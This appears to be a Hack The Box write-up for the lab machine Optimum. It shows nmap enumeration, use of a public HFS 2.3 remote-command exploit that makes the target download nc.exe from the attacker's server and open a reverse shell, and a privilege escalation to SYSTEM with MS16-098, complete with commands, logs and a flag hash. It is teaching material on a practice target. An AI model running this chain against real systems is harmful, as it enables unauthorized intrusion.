@@ -1,0 +1,499 @@
+I"�p<p>Walkthrough for OPTIMUM - 10.10.10.8</p>
+
+<h2 id="enumeration">Enumeration</h2>
+
+<p>first we assign the ip addresses to a local variables:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">TARGET</span><span class="o">=</span>10.10.10.8
+<span class="nv">ATTACK</span><span class="o">=</span>10.10.14.34
+</code></pre></div></div>
+
+<p>First we run the nmap scan (avoiding the ping) to identify the running services:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nv">$TARGET</span> <span class="nt">-Pn</span>
+</code></pre></div></div>
+
+<p>gives:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Nmap scan report for 10.10.10.8
+Host is up (0.022s latency).
+Not shown: 999 filtered ports
+PORT   STATE SERVICE
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 6.64 seconds
+</code></pre></div></div>
+<p>Immediately this looks like a webserver, I kick up the gas to a more aggressive and focused scan:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-sV</span> <span class="nt">--script</span><span class="o">=</span>http-enum <span class="nv">$TARGET</span> <span class="nt">-Pn</span> <span class="nt">-p</span> 80
+</code></pre></div></div>
+
+<p>giving me a windows webserver running HFS 2.3:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Nmap scan report for 10.10.10.8
+Host is up (0.022s latency).
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    HttpFileServer httpd 2.3
+|_http-server-header: HFS 2.3
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+</code></pre></div></div>
+
+<p>Quickly checking the site it looks like a pretty retro system:</p>
+
+<p><img src="/assets/htb_stuff/optimum/hfs.png" alt="hfs.png" /></p>
+
+<p>I switch up gears to analysis</p>
+
+<h2 id="triage">Triage</h2>
+
+<p>I look for an exploit in searchsploit:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>searchsploit HFS 2.3
+</code></pre></div></div>
+
+<p>has a few exploits:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>----------------------------------------------------------------------------- ----------------------------------------
+ Exploit Title                                                               |  Path
+                                                                             | (/usr/share/exploitdb/)
+----------------------------------------------------------------------------- ----------------------------------------
+Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload               | exploits/multiple/remote/30850.txt
+Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)          | exploits/windows/remote/34668.txt
+Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)          | exploits/windows/remote/39161.py
+Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution     | exploits/windows/webapps/34852.txt
+----------------------------------------------------------------------------- ----------------------------------------
+Shellcodes: No Result
+Papers: No Result
+</code></pre></div></div>
+
+<p>I like python and RCE exploits could be a quick win, so I examine the code:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>searchsploit <span class="nt">-x</span> 39161
+</code></pre></div></div>
+
+<p>to find the comment:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#EDB Note: You need to be using a web server hosting netcat (http://&lt;attackers_ip&gt;:80/nc.exe).  
+#          You may need to run it multiple times for success!
+</code></pre></div></div>
+
+<p>ok, thats easy, modern Kali ship with nc.exe here: <code class="highlighter-rouge">/usr/share/windows-resources/binaries/nc.exe</code></p>
+
+<p>Looking through the payload I think we have a vbs script that uploads and runs our nc.exe agaist our attacker.</p>
+
+<p>I copy the exploit and the nc binary to my working directory:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>searchsploit <span class="nt">-m</span> 39161
+<span class="nb">cp</span> /usr/share/windows-resources/binaries/nc.exe <span class="nb">.</span>
+</code></pre></div></div>
+
+<p>edit the exploit on line 35 from:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="n">ip_addr</span> <span class="o">=</span> <span class="s">"192.168.44.128"</span> <span class="c1">#local IP address
+</span></code></pre></div></div>
+
+<p>to</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="n">ip_addr</span> <span class="o">=</span> <span class="s">"10.10.14.37"</span> <span class="c1">#local IP address
+</span></code></pre></div></div>
+
+<p>This suggests I need a local listener on port 443 which I set with:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nc <span class="nt">-nvlp</span> 443
+</code></pre></div></div>
+
+<p>http://127.0.0.1/nc.exe
+I open 2 new terminal tabs and open a simple http server in python in one:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>python <span class="nt">-m</span> SimpleHTTPServer 80
+</code></pre></div></div>
+
+<p>the other I use to trigger my exploit:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python 39161.py <span class="nv">$TARGET</span> 80 
+</code></pre></div></div>
+
+<h2 id="exploit">Exploit</h2>
+
+<p>This took a few attempts (as suggested in the exploit) but evetually via troubleshooting we see this in the http server terminal:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>127.0.0.1 - - [20/Nov/2019 16:01:39] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [20/Nov/2019 16:01:39] code 404, message File not found
+127.0.0.1 - - [20/Nov/2019 16:01:39] "GET /favicon.ico HTTP/1.1" 404 -
+</code></pre></div></div>
+
+<p>This is strange, the file file should be there, I check manually via my browser and see the following line:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>127.0.0.1 - - [20/Nov/2019 16:07:26] "GET /nc.exe HTTP/1.1" 200 -
+</code></pre></div></div>
+
+<p>ok, the file is there, need to debug the script some more perhaps?</p>
+
+<p>I check the script for typos an noticed I’d missed a ‘.’ in the IP address, I correct and run again:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python 39161.py <span class="nv">$TARGET</span> 80 
+</code></pre></div></div>
+
+<p>This time execution is confirmed as Optimum hits my server:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.10.8 - - [20/Nov/2019 16:10:46] "GET /nc.exe HTTP/1.1" 200 -
+10.10.10.8 - - [20/Nov/2019 16:10:46] "GET /nc.exe HTTP/1.1" 200 -
+10.10.10.8 - - [20/Nov/2019 16:10:46] "GET /nc.exe HTTP/1.1" 200 -
+10.10.10.8 - - [20/Nov/2019 16:10:46] "GET /nc.exe HTTP/1.1" 200 -
+</code></pre></div></div>
+
+<p>When I check my listener:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>listening on [any] 443 ..
+</code></pre></div></div>
+
+<p>Nothing, ok I know it connected maybe there is an issue client side as described in the exploit, I run again:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python 39161.py <span class="nv">$TARGET</span> 80 
+</code></pre></div></div>
+
+<p>This time it pops a shell in kostas’s desktop:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>connect to [10.10.14.37] from (UNKNOWN) [10.10.10.8] 49166
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\Users\kostas\Desktop&gt;
+</code></pre></div></div>
+
+<p>d0c39409d7b994a9a1389ebf38ef5f73</p>
+
+<h2 id="priv-escalation">Priv Escalation</h2>
+
+<p>When manually doing priv esc on Windows I have a playbook to run through, sure there are several tools but they dull the learning process.</p>
+
+<pre><code class="language-cmd">net user
+</code></pre>
+
+<p>gives</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+User accounts for \\OPTIMUM
+
+-------------------------------------------------------------------------------
+Administrator            Guest                    kostas                   
+The command completed successfully.
+
+</code></pre></div></div>
+
+<p>Ok single user and standard local Administrator and Guest configuration, checking the user setings with <code class="highlighter-rouge">net user &lt;username&gt;</code> all the users fit the bill and I see as kostas I am low priv user.</p>
+
+<p>Next I look for a quick win via kernel attacks, using</p>
+
+<pre><code class="language-cmd">sysinfo
+</code></pre>
+
+<p>I get:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Host Name:                 OPTIMUM
+OS Name:                   Microsoft Windows Server 2012 R2 Standard
+OS Version:                6.3.9600 N/A Build 9600
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Server
+OS Build Type:             Multiprocessor Free
+Registered Owner:          Windows User
+Registered Organization:   
+Product ID:                00252-70000-00000-AA535
+Original Install Date:     18/3/2017, 1:51:36 ��
+System Boot Time:          27/11/2019, 1:07:13 ��
+System Manufacturer:       VMware, Inc.
+System Model:              VMware Virtual Platform
+System Type:               x64-based PC
+Processor(s):              1 Processor(s) Installed.
+                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
+BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             el;Greek
+Input Locale:              en-us;English (United States)
+Time Zone:                 (UTC+02:00) Athens, Bucharest
+Total Physical Memory:     4.095 MB
+Available Physical Memory: 3.489 MB
+Virtual Memory: Max Size:  5.503 MB
+Virtual Memory: Available: 4.693 MB
+Virtual Memory: In Use:    810 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    HTB
+Logon Server:              \\OPTIMUM
+Hotfix(s):                 31 Hotfix(s) Installed.
+                           [01]: KB2959936
+                           [02]: KB2896496
+                           [03]: KB2919355
+                           [04]: KB2920189
+                           [05]: KB2928120
+                           [06]: KB2931358
+                           [07]: KB2931366
+                           [08]: KB2933826
+                           [09]: KB2938772
+                           [10]: KB2949621
+                           [11]: KB2954879
+                           [12]: KB2958262
+                           [13]: KB2958263
+                           [14]: KB2961072
+                           [15]: KB2965500
+                           [16]: KB2966407
+                           [17]: KB2967917
+                           [18]: KB2971203
+                           [19]: KB2971850
+                           [20]: KB2973351
+                           [21]: KB2973448
+                           [22]: KB2975061
+                           [23]: KB2976627
+                           [24]: KB2977629
+                           [25]: KB2981580
+                           [26]: KB2987107
+                           [27]: KB2989647
+                           [28]: KB2998527
+                           [29]: KB3000850
+                           [30]: KB3003057
+                           [31]: KB3014442
+Network Card(s):           1 NIC(s) Installed.
+                           [01]: Intel(R) 82574L Gigabit Network Connection
+                                 Connection Name: Ethernet0
+                                 DHCP Enabled:    No
+                                 IP address(es)
+                                 [01]: 10.10.10.8
+Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
+</code></pre></div></div>
+
+<p>Which I save to a file in my working directory called: <strong>htb-optimum.txt</strong></p>
+
+<p>Useful info here is the  <strong>System Type:</strong> which is <strong>x64-based PC</strong> and the 31 Hotfixes starting KB….</p>
+
+<p>Now we could manually scrape through each of these and compare them to MS Security updates, or we can hit up <a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">Windows-Exploit-Suggester</a></p>
+
+<p>This tool is a handy python script that takes all the manual work out of the comparisons.</p>
+
+<p>Quickly I update the records:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./windows-exploit-suggester.py <span class="nt">--update</span>
+</code></pre></div></div>
+
+<p>Which generates a new data file.</p>
+
+<p>I run against the optimum data via the following command:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./windows-exploit-suggester.py <span class="nt">--database</span> 2019-11-20-mssb.xls <span class="nt">--systeminfo</span> htb-optimum.txt
+</code></pre></div></div>
+
+<p>To get a nice list of exploits</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[*] initiating winsploit version 3.3...
+[*] database file detected as xls or xlsx based on extension
+[*] attempting to read from the systeminfo input file
+[+] systeminfo input file read successfully (utf-8)
+[*] querying database file for potential vulnerabilities
+[*] comparing the 32 hotfix(es) against the 266 potential bulletins(s) with a database of 137 known exploits
+[*] there are now 246 remaining vulns
+[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
+[+] windows version identified as 'Windows 2012 R2 64-bit'
+[*] 
+[E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important
+[*]   https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial of Service (MS16-135)
+[*]   https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - 'win32k.sys' 'NtSetWindowLongPtr' Privilege Escalation (MS16-135) (2)
+[*]   https://github.com/tinysec/public/tree/master/CVE-2016-7255
+[*] 
+[E] MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important
+[*]   https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098)
+[*] 
+[M] MS16-075: Security Update for Windows SMB Server (3164038) - Important
+[*]   https://github.com/foxglovesec/RottenPotato
+[*]   https://github.com/Kevin-Robertson/Tater
+[*]   https://bugs.chromium.org/p/project-zero/issues/detail?id=222 -- Windows: Local WebDAV NTLM Reflection Elevation of Privilege
+[*]   https://foxglovesecurity.com/2016/01/16/hot-potato/ -- Hot Potato - Windows Privilege Escalation
+[*] 
+[E] MS16-074: Security Update for Microsoft Graphics Component (3164036) - Important
+[*]   https://www.exploit-db.com/exploits/39990/ -- Windows - gdi32.dll Multiple DIB-Related EMF Record Handlers Heap-Based Out-of-Bounds Reads/Memory Disclosure (MS16-074), PoC
+[*]   https://www.exploit-db.com/exploits/39991/ -- Windows Kernel - ATMFD.DLL NamedEscape 0x250C Pool Corruption (MS16-074), PoC
+[*] 
+[E] MS16-063: Cumulative Security Update for Internet Explorer (3163649) - Critical
+[*]   https://www.exploit-db.com/exploits/39994/ -- Internet Explorer 11 - Garbage Collector Attribute Type Confusion (MS16-063), PoC
+[*] 
+[E] MS16-032: Security Update for Secondary Logon to Address Elevation of Privile (3143141) - Important
+[*]   https://www.exploit-db.com/exploits/40107/ -- MS16-032 Secondary Logon Handle Privilege Escalation, MSF
+[*]   https://www.exploit-db.com/exploits/39574/ -- Microsoft Windows 8.1/10 - Secondary Logon Standard Handles Missing Sanitization Privilege Escalation (MS16-032), PoC
+[*]   https://www.exploit-db.com/exploits/39719/ -- Microsoft Windows 7-10 &amp; Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (PowerShell), PoC
+[*]   https://www.exploit-db.com/exploits/39809/ -- Microsoft Windows 7-10 &amp; Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (C#)
+[*] 
+[M] MS16-016: Security Update for WebDAV to Address Elevation of Privilege (3136041) - Important
+[*]   https://www.exploit-db.com/exploits/40085/ -- MS16-016 mrxdav.sys WebDav Local Privilege Escalation, MSF
+[*]   https://www.exploit-db.com/exploits/39788/ -- Microsoft Windows 7 - WebDAV Privilege Escalation Exploit (MS16-016) (2), PoC
+[*]   https://www.exploit-db.com/exploits/39432/ -- Microsoft Windows 7 SP1 x86 - WebDAV Privilege Escalation (MS16-016) (1), PoC
+[*] 
+[E] MS16-014: Security Update for Microsoft Windows to Address Remote Code Execution (3134228) - Important
+[*]   Windows 7 SP1 x86 - Privilege Escalation (MS16-014), https://www.exploit-db.com/exploits/40039/, PoC
+[*] 
+[E] MS16-007: Security Update for Microsoft Windows to Address Remote Code Execution (3124901) - Important
+[*]   https://www.exploit-db.com/exploits/39232/ -- Microsoft Windows devenum.dll!DeviceMoniker::Load() - Heap Corruption Buffer Underflow (MS16-007), PoC
+[*]   https://www.exploit-db.com/exploits/39233/ -- Microsoft Office / COM Object DLL Planting with WMALFXGFXDSP.dll (MS-16-007), PoC
+[*] 
+[E] MS15-132: Security Update for Microsoft Windows to Address Remote Code Execution (3116162) - Important
+[*]   https://www.exploit-db.com/exploits/38968/ -- Microsoft Office / COM Object DLL Planting with comsvcs.dll Delay Load of mqrt.dll (MS15-132), PoC
+[*]   https://www.exploit-db.com/exploits/38918/ -- Microsoft Office / COM Object els.dll DLL Planting (MS15-134), PoC
+[*] 
+[E] MS15-112: Cumulative Security Update for Internet Explorer (3104517) - Critical
+[*]   https://www.exploit-db.com/exploits/39698/ -- Internet Explorer 9/10/11 - CDOMStringDataList::InitFromString Out-of-Bounds Read (MS15-112)
+[*] 
+[E] MS15-111: Security Update for Windows Kernel to Address Elevation of Privilege (3096447) - Important
+[*]   https://www.exploit-db.com/exploits/38474/ -- Windows 10 Sandboxed Mount Reparse Point Creation Mitigation Bypass (MS15-111), PoC
+[*] 
+[E] MS15-102: Vulnerabilities in Windows Task Management Could Allow Elevation of Privilege (3089657) - Important
+[*]   https://www.exploit-db.com/exploits/38202/ -- Windows CreateObjectTask SettingsSyncDiagnostics Privilege Escalation, PoC
+[*]   https://www.exploit-db.com/exploits/38200/ -- Windows Task Scheduler DeleteExpiredTaskAfter File Deletion Privilege Escalation, PoC
+[*]   https://www.exploit-db.com/exploits/38201/ -- Windows CreateObjectTask TileUserBroker Privilege Escalation, PoC
+[*] 
+[E] MS15-097: Vulnerabilities in Microsoft Graphics Component Could Allow Remote Code Execution (3089656) - Critical
+[*]   https://www.exploit-db.com/exploits/38198/ -- Windows 10 Build 10130 - User Mode Font Driver Thread Permissions Privilege Escalation, PoC
+[*]   https://www.exploit-db.com/exploits/38199/ -- Windows NtUserGetClipboardAccessToken Token Leak, PoC
+[*] 
+[M] MS15-078: Vulnerability in Microsoft Font Driver Could Allow Remote Code Execution (3079904) - Critical
+[*]   https://www.exploit-db.com/exploits/38222/ -- MS15-078 Microsoft Windows Font Driver Buffer Overflow
+[*] 
+[E] MS15-052: Vulnerability in Windows Kernel Could Allow Security Feature Bypass (3050514) - Important
+[*]   https://www.exploit-db.com/exploits/37052/ -- Windows - CNG.SYS Kernel Security Feature Bypass PoC (MS15-052), PoC
+[*] 
+[M] MS15-051: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (3057191) - Important
+[*]   https://github.com/hfiref0x/CVE-2015-1701, Win32k Elevation of Privilege Vulnerability, PoC
+[*]   https://www.exploit-db.com/exploits/37367/ -- Windows ClientCopyImage Win32k Exploit, MSF
+[*] 
+[E] MS15-010: Vulnerabilities in Windows Kernel-Mode Driver Could Allow Remote Code Execution (3036220) - Critical
+[*]   https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows 8.1 - win32k Local Privilege Escalation (MS15-010), PoC
+[*]   https://www.exploit-db.com/exploits/37098/ -- Microsoft Windows - Local Privilege Escalation (MS15-010), PoC
+[*]   https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows win32k Local Privilege Escalation (MS15-010), PoC
+[*] 
+[E] MS15-001: Vulnerability in Windows Application Compatibility Cache Could Allow Elevation of Privilege (3023266) - Important
+[*]   http://www.exploit-db.com/exploits/35661/ -- Windows 8.1 (32/64 bit) - Privilege Escalation (ahcache.sys/NtApphelpCacheControl), PoC
+[*] 
+[E] MS14-068: Vulnerability in Kerberos Could Allow Elevation of Privilege (3011780) - Critical
+[*]   http://www.exploit-db.com/exploits/35474/ -- Windows Kerberos - Elevation of Privilege (MS14-068), PoC
+[*] 
+[M] MS14-064: Vulnerabilities in Windows OLE Could Allow Remote Code Execution (3011443) - Critical
+[*]   https://www.exploit-db.com/exploits/37800// -- Microsoft Windows HTA (HTML Application) - Remote Code Execution (MS14-064), PoC
+[*]   http://www.exploit-db.com/exploits/35308/ -- Internet Explorer OLE Pre-IE11 - Automation Array Remote Code Execution / Powershell VirtualAlloc (MS14-064), PoC
+[*]   http://www.exploit-db.com/exploits/35229/ -- Internet Explorer &lt;= 11 - OLE Automation Array Remote Code Execution (#1), PoC
+[*]   http://www.exploit-db.com/exploits/35230/ -- Internet Explorer &lt; 11 - OLE Automation Array Remote Code Execution (MSF), MSF
+[*]   http://www.exploit-db.com/exploits/35235/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution Through Python, MSF
+[*]   http://www.exploit-db.com/exploits/35236/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution, MSF
+[*] 
+[M] MS14-060: Vulnerability in Windows OLE Could Allow Remote Code Execution (3000869) - Important
+[*]   http://www.exploit-db.com/exploits/35055/ -- Windows OLE - Remote Code Execution 'Sandworm' Exploit (MS14-060), PoC
+[*]   http://www.exploit-db.com/exploits/35020/ -- MS14-060 Microsoft Windows OLE Package Manager Code Execution, MSF
+[*] 
+[M] MS14-058: Vulnerabilities in Kernel-Mode Driver Could Allow Remote Code Execution (3000061) - Critical
+[*]   http://www.exploit-db.com/exploits/35101/ -- Windows TrackPopupMenu Win32k NULL Pointer Dereference, MSF
+[*] 
+[E] MS13-101: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (2880430) - Important
+[M] MS13-090: Cumulative Security Update of ActiveX Kill Bits (2900986) - Critical
+[*] done
+</code></pre></div></div>
+
+<p>MS16-032 looks like a good option, it is fairly new has 4 PoC exploits and importantly ships with a c# (which can be compiled) and a powershell version (if I get stuck compiling) I start with the C# one:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>searchsploit <span class="nt">-x</span> 39809
+</code></pre></div></div>
+
+<p>It looks like pretty standard C# code, which I’m not so great at but skimming through I don’t see any errors. C# is prefferable to the PoSH script as it’s less likley to be noticed in logging but is harder to deal with in a Linux environment.</p>
+
+<p>I copy it to my working environment:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>searchsploit <span class="nt">-m</span> 39809
+</code></pre></div></div>
+
+<p>Typically I use dockcross for cross compiling C exploits, but for C# I can use mono provided I know a refernce point for mcs. From the exploit notes I see it uses System.Management.Automation.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># It uses the System.Management.Automation namespace, so make sure you have the System.Management.Automation.dll within your source path when compiling outside of Visual Studio.
+</code></pre></div></div>
+
+<p>mcs doesn’t handle # comments, so I remove those lines and then</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mcs -reference:System.Management.Automation.dll 39809.cs
+</code></pre></div></div>
+
+<p>but throws the following error:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>error CS0006: Metadata file `System.Management.Automation.dll' could not be found
+</code></pre></div></div>
+
+<p>At this point I can compile in windows, but what if I don’t have access to windows?</p>
+
+<p>Well, a x64 version is availabe <a href="https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-032/x64/ms16-032.exe">here</a></p>
+
+<p>I look at the exploit and in my cmd shell go to where nc.exe is transfered and go there:</p>
+
+<pre><code class="language-cmd">cd C:\Users\Public
+</code></pre>
+
+<p>I try a few different methods to transfer my evil binary ad it fails. I begin to suspect I’ve got a bad shell and while I’m researching a solution I discover an easier exploit MS16-098, <a href="https://docs.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-098">here</a></p>
+
+<p>Theres a binary as well <a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-098">MS16-098</a> I change tact an download it to my working directory.</p>
+
+<p>I then do a find replace on my exploit, changing <code class="highlighter-rouge">nc.exe</code> to <code class="highlighter-rouge">bfill.exe</code> and execute it again:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python 39161.py <span class="nv">$TARGET</span> 80
+</code></pre></div></div>
+
+<p>This errors out, but has the desired effect of transferring the file. On optimum I run:</p>
+
+<pre><code class="language-cmd">bfill.exe
+</code></pre>
+
+<p>after a few seconds I get a shell:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\Users\Public&gt;
+</code></pre></div></div>
+
+<p>I check my user:</p>
+
+<pre><code class="language-cmd">whoami
+</code></pre>
+
+<p>And I’m system! W00t!W00t!</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nt authority\system
+</code></pre></div></div>
+
+<p>This was a messy path to system, I chalk it up to experience but need to spend a bit of time in the future working out a tool set for cross compilation and file transfers.</p>
+
+<h2 id="bonus">Bonus</h2>
+
+<p>Pre-compiled exploits <a href="https://github.com/SecWiki/windows-kernel-exploits">here</a></p>
+
+<p>Get mono for C# development:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>apt-get <span class="nb">install </span>mono-devel
+</code></pre></div></div>
+
+<p>Get dotnetcore for C# development trust the package keys get from source <a href="https://dotnet.microsoft.com/download/dotnet-core/thank-you/sdk-3.0.101-linux-x64-binaries">here</a></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cp ~/Downloads/dotnet-sdk-3.0.101-linux-x64.tar.gz .
+mkdir -p $HOME/dotnet &amp;&amp; tar zxf dotnet-sdk-3.0.101-linux-x64.tar.gz -C $HOME/dotnet
+export DOTNET_ROOT=$HOME/dotnet
+export PATH=$PATH:$HOME/dotnet
+</code></pre></div></div>
+
+<p>get visual studio from <a href="https://visualstudio.microsoft.com/free-developer-offers/">here</a></p>
+
+<blockquote>
+  <p>These virtual machines expire after 90 days. We recommend setting a snapshot when you first install the virtual machine which you can roll back to later. Mac users will need to use a tool that supports zip64, like The Unarchiver, to unzip the files.
+The password to your VM is “Passw0rd!”</p>
+</blockquote>
+
+<p>Make sure windows defender is disabled or your work will be deleted!</p>
+
+<p>get VMware Player 15 from <a href="https://my.vmware.com/en/web/vmware/free#desktop_end_user_computing/vmware_workstation_player/15_0">here</a></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>chmod +x VMware-Player-15.5.1-15018445.x86_64.bundle
+sudo ./VMware-Player-15.5.1-15018445.x86_64.bundle
+</code></pre></div></div>
+
+:ET
